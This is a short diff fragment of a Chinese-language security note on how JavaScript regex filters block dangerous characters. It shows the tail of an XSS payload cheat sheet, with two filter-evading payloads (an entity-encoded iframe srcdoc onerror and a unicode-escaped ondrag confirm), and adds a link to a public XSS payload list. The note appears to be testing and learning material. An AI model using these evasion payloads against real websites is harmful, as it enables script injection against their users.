@@ -113,7 +113,8 @@ js中會用正規表達式來過濾危險字符，參考如下文件：
 "><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
 "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
 ```
-上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
+上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
+[Brute XSS payload by Pgaijin66](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)
 
 ## Reference
 1. The Web Application Hacker's Handbook  
